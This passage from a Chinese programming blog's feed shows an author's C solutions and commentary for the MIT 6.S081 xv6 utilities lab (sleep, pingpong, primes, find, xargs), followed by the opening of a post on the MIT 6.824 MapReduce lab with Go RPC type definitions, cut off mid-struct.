<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> wait = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span>(argc &lt;= <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sleep: need parameter error\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">   wait = <span class="built_in">atoi</span>(argv[<span class="number">1</span>]);</span><br><span class="line">   <span class="built_in">sleep</span>(wait);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-pingpong"><a href="#2-pingpong" class="headerlink" title="2. pingpong"></a>2. pingpong</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Write a program that uses UNIX system calls to &#x27;&#x27;ping-pong&#x27;&#x27; a byte between two processes over a pair of pipes, one for each direction. The parent should send a byte to the child; the child should print &quot;&lt;pid&gt;: received ping&quot;, where &lt;pid&gt; is its process ID, write the byte on the pipe to the parent, and exit; the parent should read the byte from the child, print &quot;&lt;pid&gt;: received pong&quot;, and exit. Your solution should be in the file user/pingpong.c.</span><br></pre></td></tr></table></figure>
<p>利用管道实现子进程与父进程的通信，通过这个简单的程序熟悉<code>pipe</code>的使用，不过很坑爹的是这个操作系统的管道不支持双端通信，只支持一端是写，一端是读，这个<code>bug</code>调试了很长时间才发现是这个问题。具体实现方法为：开两个管道，父进程往管道<code>1</code>里写数据，从管道<code>2</code>中读数据，子进程从管道<code>1</code>读数据，从管道<code>2</code>写数据。</p>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> p1[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> p2[<span class="number">2</span>];</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(argc &gt; <span class="number">1</span>)&#123;</span><br><span class="line">       <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;Only 1 argument is needed!\n&quot;</span>);</span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// creat a pipe</span></span><br><span class="line">    <span class="built_in">pipe</span>(p1);</span><br><span class="line">    <span class="built_in">pipe</span>(p2);</span><br><span class="line">    <span class="comment">// child</span></span><br><span class="line">    <span class="keyword">if</span>(fork() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">char</span> buffer[<span class="number">32</span>];</span><br><span class="line">        <span class="comment">//read from the parent</span></span><br><span class="line">        <span class="built_in">close</span>(p1[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">close</span>(p2[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">read</span>(p1[<span class="number">0</span>],buffer,<span class="number">4</span>);</span><br><span class="line">        <span class="built_in">close</span>(p1[<span class="number">0</span>]);</span><br><span class="line">        <span class="comment">// write a byte to the parent</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: received ping\n&quot;</span>,<span class="built_in">getpid</span>());</span><br><span class="line">        <span class="built_in">write</span>(p2[<span class="number">1</span>],<span class="string">&quot;pong&quot;</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="built_in">close</span>(p2[<span class="number">1</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="type">char</span> buffer[<span class="number">32</span>];</span><br><span class="line">        <span class="comment">// send a byte</span></span><br><span class="line">        <span class="built_in">close</span>(p1[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">close</span>(p2[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">write</span>(p1[<span class="number">1</span>],<span class="string">&quot;ping&quot;</span>,<span class="number">4</span>);</span><br><span class="line">        <span class="built_in">close</span>(p1[<span class="number">1</span>]);</span><br><span class="line">        <span class="comment">// receive from child</span></span><br><span class="line">        <span class="built_in">read</span>(p2[<span class="number">0</span>],buffer,<span class="number">4</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: received pong\n&quot;</span>,<span class="built_in">getpid</span>());</span><br><span class="line">        <span class="built_in">close</span>(p2[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-primes"><a href="#3-primes" class="headerlink" title="3. primes"></a>3. primes</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Write a concurrent version of prime sieve using pipes. This idea is due to Doug McIlroy, inventor of Unix pipes. The picture halfway down this page and the surrounding text explain how to do it. Your solution should be in the file user/primes.c.</span><br></pre></td></tr></table></figure>
<p>利用进程实现素数筛选，不知道为什么实现的很蛋疼。估计还是<code>xv6</code>的文件描述符资源有限不能很好支持多个管道同时读写，因为开的管道过多，资源就卡住了，各种问题不知道有没有人实现快速版本，及子进程同时接受数据也同时开始计算，并同时开始写数据。目前这个的实现很糙，将当前进程筛选的不能被第一个素数整数的数据全部写入管道中，交给子进程去处理，依次这样递归下去即可。这个做法就是跟素数的快速筛查的算法是处理的一模一样的,在$O(n)$的时间复杂度内筛选出所有小于$n$的素数。</p>
<p><img src="https://i.loli.net/2021/06/08/dtliNxaYBsSP7Fu.gif"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p = get a number from left neighbor</span><br><span class="line">print p</span><br><span class="line">loop:</span><br><span class="line">    n = get a number from left neighbor</span><br><span class="line">    if (p does not divide n)</span><br><span class="line">        send n to right neighbor</span><br></pre></td></tr></table></figure>
<p>需要特殊处理的是父进程需要等待子进程完成后，才能退出。</p>
<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">process</span><span class="params">(<span class="type">const</span> <span class="type">int</span> * p)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> prime = <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> pip[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*close p1*/</span></span><br><span class="line">    <span class="built_in">pipe</span>(pip);</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">read</span>(p[<span class="number">0</span>],&amp;num,<span class="number">4</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(num == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(prime == <span class="number">1</span>)&#123;</span><br><span class="line">            prime = num;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prime %d\n&quot;</span>,prime);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(num%prime == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="built_in">write</span>(pip[<span class="number">1</span>],&amp;num,<span class="number">4</span>);</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(p[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">close</span>(pip[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span>(prime &gt; <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(fork() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">process</span>(pip);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">wait</span>(&amp;status);</span><br><span class="line">    <span class="built_in">close</span>(pip[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> p[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">pipe</span>(p);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt;= <span class="number">35</span>; ++i)&#123;</span><br><span class="line">        <span class="built_in">write</span>(p[<span class="number">1</span>],&amp;i,<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(p[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">process</span>(p);</span><br><span class="line">    <span class="built_in">close</span>(p[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="4-find"><a href="#4-find" class="headerlink" title="4. find"></a>4. find</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Write a simple version of the UNIX find program: find all the files in a directory tree with a specific name. Your solution should be in the file user/find.c.</span><br></pre></td></tr></table></figure>
<p>实现一个简单的查找文件名为指定关键字的程序，典型的利用递归查找到子目录下，即可完成所有子目录的查找。这个就是常规的操作。各种处理文件时需要查找相应的库函数，需要小心处理。</p>
<h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">getname</span><span class="params">(<span class="type">char</span> *path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  <span class="comment">// Find first character after last slash.</span></span><br><span class="line">  <span class="keyword">for</span>(p=path+<span class="built_in">strlen</span>(path); p &gt;= path &amp;&amp; *p != <span class="string">&#x27;/&#x27;</span>; p--)&#123;&#125;</span><br><span class="line">  <span class="comment">// skip &#x27;/&#x27;</span></span><br><span class="line">  p++;</span><br><span class="line">  <span class="comment">// Return blank-padded name.</span></span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">find</span><span class="params">(<span class="type">char</span> *path,<span class="type">const</span> <span class="type">char</span> * filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">512</span>], *p;</span><br><span class="line">  <span class="type">char</span> *curr;</span><br><span class="line">  <span class="type">char</span> *fname;</span><br><span class="line">  <span class="type">int</span> fd;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">dirent</span> de;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">stat</span> st;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// open the dir</span></span><br><span class="line">  <span class="keyword">if</span>((fd = <span class="built_in">open</span>(path, <span class="number">0</span>)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;ls: cannot open %s\n&quot;</span>, path);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// open stat</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">fstat</span>(fd, &amp;st) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;ls: cannot stat %s\n&quot;</span>, path);</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// check the current the file is </span></span><br><span class="line">  <span class="keyword">if</span>(st.type != T_DIR)&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;the current the file is not dictionary\n&quot;</span>, path);</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//read all the files under the dir</span></span><br><span class="line">  <span class="built_in">strcpy</span>(buf, path);</span><br><span class="line">  p = buf + <span class="built_in">strlen</span>(buf);</span><br><span class="line">  *p++ = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">  <span class="keyword">while</span>(<span class="built_in">read</span>(fd, &amp;de, <span class="built_in">sizeof</span>(de)) == <span class="built_in">sizeof</span>(de))&#123;</span><br><span class="line">      <span class="keyword">if</span>(de.inum == <span class="number">0</span>)</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">      <span class="comment">// skip &quot;.&quot; and &quot;..&quot;</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strcmp</span>(de.name,<span class="string">&quot;.&quot;</span>) == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strcmp</span>(de.name,<span class="string">&quot;..&quot;</span>) == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      curr = p;</span><br><span class="line">      <span class="built_in">memmove</span>(curr, de.name, DIRSIZ);</span><br><span class="line">      curr[DIRSIZ] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">stat</span>(buf, &amp;st) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;ls: cannot stat %s\n&quot;</span>, buf);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// printf(&quot;current file name is：%s \n&quot;,buf);</span></span><br><span class="line">      <span class="comment">// record the current file</span></span><br><span class="line">      <span class="keyword">switch</span>(st.type)&#123;</span><br><span class="line">        <span class="comment">// we check the current file</span></span><br><span class="line">        <span class="keyword">case</span> T_FILE:</span><br><span class="line">            fname = <span class="built_in">getname</span>(buf);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(fname,filename) == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// we check the current dir</span></span><br><span class="line">        <span class="keyword">case</span> T_DIR:</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strlen</span>(path) + <span class="number">1</span> + DIRSIZ + <span class="number">1</span> &gt; <span class="built_in">sizeof</span>(buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ls: path too long\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">find</span>(buf,filename);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(argc != <span class="number">3</span>)&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;we need 3 paramters!\n&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">find</span>(argv[<span class="number">1</span>],argv[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="5-xargs"><a href="#5-xargs" class="headerlink" title="5. xargs"></a>5. xargs</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Write a simple version of the UNIX xargs program: read lines from the standard input and run a command for each line, supplying the line as arguments to the command. Your solution should be in the file user/xargs.c.</span><br></pre></td></tr></table></figure>
<p>实现类似于<code>unix</code>下的<code>xargs</code>操作，这个因为要求的比较低，其实非常容易完成，我们只需要利用<code>fork</code>和<code>exec</code>函数即可完成。我们每次标准输入，在<code>xv6</code>操作系统中，标准输入及时<code>fd 0</code>读取即可，标准输出即为写入<code>fd 1</code>即可，本质来说非常简单。将参数从标准输入读入然后作为附加参数执行<code>xargs</code>后面的程序。简单就是将输入参数进行重写即可。具体可以参考代码实现。</p>
<h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/param.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="type">char</span> buf[<span class="number">512</span>];</span><br><span class="line">   <span class="type">char</span> *args[MAXARG];</span><br><span class="line">   <span class="type">char</span> c;</span><br><span class="line">   <span class="type">char</span> *p;</span><br><span class="line">   <span class="type">int</span> n;</span><br><span class="line">   <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="built_in">sizeof</span>(buf));</span><br><span class="line">   <span class="built_in">memset</span>(args,<span class="number">0</span>,<span class="built_in">sizeof</span>(args));</span><br><span class="line">   <span class="keyword">if</span>(argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;need more parameter!\n&quot;</span>);</span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*read from the file*/</span></span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc; ++i)&#123;</span><br><span class="line">       args[i<span class="number">-1</span>] = argv[i];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">     p = buf;</span><br><span class="line">     <span class="comment">/*read each line from the stand input*/</span></span><br><span class="line">     <span class="keyword">while</span>((n = <span class="built_in">read</span>(<span class="number">0</span>,&amp;c,<span class="number">1</span>)) &amp;&amp; c != <span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">        *p = c;</span><br><span class="line">        p++;</span><br><span class="line">     &#125;</span><br><span class="line">     *p = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">     <span class="keyword">if</span>(p != buf)&#123;</span><br><span class="line">        args[argc<span class="number">-1</span>] = buf;</span><br><span class="line">        <span class="keyword">if</span>(fork() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">exec</span>(argv[<span class="number">1</span>],args);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">wait</span>(&amp;status);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">if</span>(n &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;read error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Optional-challenge-exercises"><a href="#Optional-challenge-exercises" class="headerlink" title="Optional challenge exercises"></a>Optional challenge exercises</h2><p>最后看了后面几个挑战题目也都是非常有意思，后面准备继续将三个挑战题目也完成，总的来说题目质量真心非常不错。</p>
<ul>
<li><code>uptime</code>:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Write an uptime program that prints the uptime in terms of ticks using the uptime system call. (easy)</span><br></pre></td></tr></table></figure></li>
<li><code>regular</code><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Support regular expressions in name matching for find. grep.c has some primitive support for regular expressions. (easy)</span><br></pre></td></tr></table></figure></li>
<li><code>sh</code>:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The xv6 shell (user/sh.c) is just another user program and you can improve it. It is a minimal shell and lacks many features found in real shell. For example, modify the shell to not print a $ when processing shell commands from a file (moderate), modify the shell to support wait (easy), modify the shell to support lists of commands, separated by &quot;;&quot; (moderate), modify the shell to support sub-shells by implementing &quot;(&quot; and &quot;)&quot; (moderate), modify the shell to support tab completion (easy), modify the shell to keep a history of passed shell commands (moderate), or anything else you would like your shell to do. (If you are very ambitious, you may have to modify the kernel to support the kernel features you need; xv6 doesn&#x27;t support much.)</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>MIT6.S081</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>【MIT6.824】lab 1 mapreduce</title>
    <url>/2022/11/20/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/73/</url>
    <content><![CDATA[<h1 id="MIT6-824-2021-lab1"><a href="#MIT6-824-2021-lab1" class="headerlink" title="MIT6.824 2021 lab1"></a>MIT6.824 2021 lab1</h1><p>终于在跌跌撞撞中完成了<code>MIT lab1 map-reduce</code>的<code>lab</code>，仔细对比了一下，<code>2021</code>年的<code>lab</code>要比之前的<code>lab</code>要复杂一些，以前的<code>map-reduce lab</code>基本上只是<code>Coordinator</code>对任务进行主动调度，<code>2021</code>的<code>lab</code>会涉及到<code>Coordinator</code>被动接受<code>worker</code>的任务请求，然后进行被动的调度，同时加入了防止任务意外中止的校验，使得系统更加完善和健壮。所有的测试结果如下所示：<br><img src="https://i.loli.net/2021/03/16/2TsRwIzVidc8apv.png"><br>所有的代码都放在github上.</p>
<h2 id="lab1"><a href="#lab1" class="headerlink" title="lab1"></a>lab1</h2><p>按照题目要求实现<code>map-reduce</code>系统，按照<code>lab</code>的要求实现调度器<code>Coordinator</code>和<code>worker</code>的基本功能，<code>lab</code>要求由<code>woker</code>主动向调度器发起任务请求，<code>Coordinator</code>按照当前的任务分配进度为每个<code>worker</code>分配<code>map</code>或者<code>reduce</code>任务，<code>reduce</code>任务必须在所有的<code>map</code>任务都完成后才能开始启动。其中的核心的难点并不是在于<code>map</code>和<code>reduce</code>的实现，难点在于如何做好<code>worker</code>和<code>Coordinator</code>之间的任务分配和调度。</p>
<h3 id="Coordinator"><a href="#Coordinator" class="headerlink" title="Coordinator"></a>Coordinator</h3><ul>
<li><code>Coordinator</code>作为一个<code>rpc server</code>,处理所有从<code>worker</code>发送过来的<code>rpc</code>请求，当然在此也顺便学习了一下<code>go</code>的<code>rpc</code>框架，其实还是挺有意思的，非常方便的消息处理框架，首先我们需要设置好双方进行消息交互的<code>rpc</code>消息格式定义，目前定义如下：<br><code>option</code>请求定义:<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> OpType <span class="type">int</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	TaskReq OpType = <span class="literal">iota</span> <span class="comment">//请求分配任务</span></span><br><span class="line">	TaskMap               <span class="comment">//分配一个map类型的任务</span></span><br><span class="line">	TaskReduce            <span class="comment">//分配一个reduce类型的任务</span></span><br><span class="line">	TaskMapDone           <span class="comment">//完成一个map任务</span></span><br><span class="line">	TaskReduceDone        <span class="comment">//完成一个reduce任务</span></span><br><span class="line">	TaskDone              <span class="comment">//所有任务均已完成</span></span><br><span class="line">	TaskWait              <span class="comment">//等待当前任务完成</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<code>rpc</code>请求消息定义:<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ReqArgs <span class="keyword">struct</span> &#123;</span><br><span class="line">	ReqId <span class="type">int64</span>    <span class="comment">// timestamp，作为本次请求分配的唯一标识。</span></span><br><span class="line">	ReqOp OpType   <span class="comment">// 消息类型</span></span><br><span class="line">	ReqTaskId <span class="type">int</span>  <span class="comment">// 任务的ID编号</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<code>rpc</code>回应消息定义：<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> ReplyArgs <span class="keyword">struct</span> &#123;</span><br><span class="line">	RepId <span class="type">int64</span>   <span class="comment">// timestamp，作为某次请求的唯一标识。</span></span><br><span class="line">	RepOp OpType  <span class="comment">//消息类型</span></span><br><span class="line">	RepTaskId <span class="type">int</span> <span class="comment">//分配的任务ID</span></span><br><span class="line">	RepnMap <span class="type">int</span>   <span class="comment">//map任务的总数</span></span><br><span class="line">	RepnReduce <span class="type">int</span> <span class="comment">//reduce任务的总数</span></span><br><span class="line">	RepContent <span class="type">string</span> <span class="comment">//map任务的文件名称</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<code>Coordinator</code>定义：<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Coordinator <span class="keyword">struct</span> &#123;</span><br><span class="line">	<span class="comment">// Your definitions here.</span></span><br><span class="line">	mapTasks <span class="keyword">chan</span> <span class="type">int</span> <span class="comment">//待分配的map任务列表</span></span><br><span class="line">	reduceTasks <span class="keyword">chan</span> <span class="type">int</span> <span class="comment">//待分配的reduce任务列表</span></span><br><span class="line">	nReduce <span class="type">int</span> <span class="comment">//reduce任务的数量</span></span><br><span class="line">	nMap <span class="type">int</span>    <span class="comment">//map的任务数量</span></span><br><span class="line">	mapRuning []<span class="type">int64</span> <span class="comment">//map任务状态</span></span><br><span class="line">	reduceRuning []<span class="type">int64</span> <span class="comment">//reduce任务状态</span></span><br><span class="line">	tasks []<span class="type">string</span> <span class="comment">//待处理的文件名称</span></span><br><span class="line">	mapCnt <span class="type">int</span>   <span class="comment">//当前未完成的map数量</span></span><br><span class="line">	reduceCnt <span class="type">int</span> <span class="comment">//当前未完成的reduce任务数量</span></span><br><span class="line">	taskDone <span class="type">bool</span>  <span class="comment">//任务是否全部完成</span></span><br><span class="line">	lock *sync.Cond  <span class="comment">//互斥锁</span></span><br><span 